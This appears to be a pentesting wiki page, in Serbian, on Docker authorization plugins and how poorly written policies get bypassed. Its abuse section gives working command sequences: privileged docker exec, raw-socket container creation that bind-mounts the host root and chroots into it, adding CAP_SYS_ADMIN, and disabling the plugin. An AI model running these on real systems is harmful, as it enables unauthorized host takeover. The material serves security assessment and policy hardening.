# Runtime authorization plugins

## Overview

Runtime authorization plugins su dodatni policy sloj koji odlučuje da li caller sme da izvrši određenu daemon akciju. Docker je klasičan primer. Podrazumevano, svako ko može da komunicira sa Docker daemon-om praktično ima široku kontrolu nad njim. Authorization plugins pokušavaju da suze ovaj model tako što ispituju authenticated user-a i zahtevanu API operaciju, a zatim dozvoljavaju ili odbijaju zahtev u skladu sa policy-jem.

Ova tema zaslužuje posebnu stranicu zato što menja model eksploatacije kada attacker već ima pristup Docker API-ju ili user-u u `docker` grupi. U takvim okruženjima pitanje više nije samo „mogu li da dođem do daemon-a?“, već i „da li je daemon zaštićen authorization slojem i, ako jeste, može li taj sloj da se zaobiđe preko neobrađenih endpoint-a, slabog JSON parsiranja ili dozvola za upravljanje plugin-ima?“

## Operation

Kada zahtev stigne do Docker daemon-a, authorization subsystem može proslediti kontekst zahteva jednom ili više instaliranih plugin-ova. Plugin vidi identitet authenticated user-a, detalje zahteva, izabrane headers-e i delove body-ja zahteva ili response-a kada je content type odgovarajući. Više plugin-ova može biti ulančano, a pristup se odobrava samo ako svi plugin-ovi dozvole zahtev.

Ovaj model deluje snažno, ali njegova bezbednost u potpunosti zavisi od toga koliko je autor policy-ja dobro razumeo API. Plugin koji blokira `docker run --privileged`, ali ignoriše `docker exec`, propušta alternativne JSON ključeve kao što je top-level `Binds` ili dozvoljava administraciju plugin-ova, može stvoriti lažan osećaj ograničenja, dok i dalje ostavlja otvorene direktne puteve za privilege escalation.

## Common Plugin Targets

Važne oblasti za policy review su:

- endpoint-i za kreiranje container-a
- polja u `HostConfig` kao što su `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` i opcije za deljenje namespace-a
- ponašanje `docker exec` komande
- endpoint-i za upravljanje plugin-ovima
- bilo koji endpoint koji može indirektno da pokrene runtime akcije izvan predviđenog policy modela

Istorijski gledano, primeri kao što su Twistlock-ov `authz` plugin i jednostavni edukativni plugin-ovi kao što je `authobot` olakšali su proučavanje ovog modela, jer su njihovi policy fajlovi i code path-ovi pokazivali kako je mapiranje endpoint-a na akcije zapravo implementirano. Za assessment je najvažnija lekcija da autor policy-ja mora da razume kompletnu API površinu, a ne samo najvidljivije CLI komande.

## Abuse

Prvi cilj je utvrditi šta je zaista blokirano. Ako daemon odbije neku akciju, greška često leak-uje naziv plugin-a, što pomaže u identifikovanju korišćene kontrole:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Ako vam je potrebno šire profilisanje endpointa, alati kao što je `docker_auth_profiler` korisni su jer automatizuju inače repetitivan zadatak provere API ruta i JSON struktura koje su zaista dozvoljene pluginu.

Ako okruženje koristi prilagođeni plugin i možete da komunicirate sa API-jem, izlistajte koja polja objekata se zaista filtriraju:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Ove provere su važne jer su mnogi propusti u autorizaciji specifični za polja, a ne za koncepte. Plugin može odbiti CLI obrazac bez potpunog blokiranja ekvivalentne API strukture.

### Potpuni primer: `docker exec` dodaje privilegije nakon kreiranja containera

Policy koja blokira kreiranje privileged containera, ali dozvoljava kreiranje unconfined containera uz `docker exec`, i dalje može biti zaobiđena:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Ako daemon prihvati drugi korak, korisnik je povratio privilegovani interaktivni proces unutar containera za koji je autor policy-ja verovao da je ograničen.

### Kompletan primer: Bind Mount kroz Raw API

Neke neispravne policy-je proveravaju samo jedan JSON oblik. Ako bind mount root filesystem-a nije dosledno blokiran, host i dalje može da bude mountovan:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Ista ideja se može pojaviti i pod `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Uticaj je potpuni escape iz host filesystem-a. Zanimljiv detalj je to što bypass potiče od nepotpune pokrivenosti policy-ja, a ne od kernel bug-a.

### Potpuni primer: Neprovereni capability atribut

Ako policy zaboravi da filtrira atribut povezan sa capability-jem, attacker može da kreira container koji ponovo dobija opasan capability:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Kada su prisutni `CAP_SYS_ADMIN` ili capability slične jačine, mnoge breakout tehnike opisane u [capabilities.md](protections/capabilities.md) i [privileged-containers.md](privileged-containers.md) postaju dostupne.

### Potpun primer: Isključivanje Plugin-a

Ako su operacije upravljanja plugin-ima dozvoljene, najčistiji bypass može biti potpuno isključivanje kontrole:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Ovo je neuspeh politike na nivou control-plane-a. Sloj autorizacije postoji, ali korisnik čija su ovlašćenja trebalo da budu ograničena i dalje ima dozvolu da ga onemogući.

## Provere

Ove komande služe za utvrđivanje da li sloj politike postoji i da li deluje potpun ili površan.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Šta je ovde zanimljivo:

- Poruke o odbijanju koje sadrže naziv plugina potvrđuju postojanje authorization sloja i često otkrivaju tačnu implementaciju.
- Lista plugina vidljiva napadaču može biti dovoljna za otkrivanje da li su operacije onemogućavanja ili ponovnog konfigurisanja moguće.
- Policy koji blokira samo očigledne CLI radnje, ali ne i neobrađene API zahteve, treba smatrati zaobilaznim dok se suprotno ne dokaže.

## Podrazumevane vrednosti runtime-a

| Runtime / platforma | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Docker Engine | Podrazumevano nije omogućen | Pristup daemonu je praktično potpun ili nikakav, osim ako nije konfigurisan authorization plugin | nepotpuna plugin policy, blackliste umesto allowlista, dozvoljeno upravljanje pluginima, slepe tačke na nivou polja |
| Podman | Nema uobičajen direktan ekvivalent | Podman se obično više oslanja na Unix dozvole, rootless izvršavanje i odluke o izlaganju API-ja nego na authz pluginove u Docker stilu | široko izlaganje rootful Podman API-ja, slabe dozvole na socketu |
| containerd / CRI-O | Drugačiji model kontrole | Ovi runtime-i se obično oslanjaju na dozvole socketa, granice poverenja na nodu i kontrole orkestratora na višem nivou, a ne na Docker authz pluginove | montiranje socketa u workload-e, slabe pretpostavke o poverenju na lokalnom nodu |
| Kubernetes | Koristi authn/authz na slojevima API servera i kubelet-a, a ne Docker authz pluginove | Cluster RBAC i admission kontrole predstavljaju glavni policy sloj | preširok RBAC, slaba admission policy, direktno izlaganje kubelet ili runtime API-ja |

{{#include ../../../banners/hacktricks-training.md}}
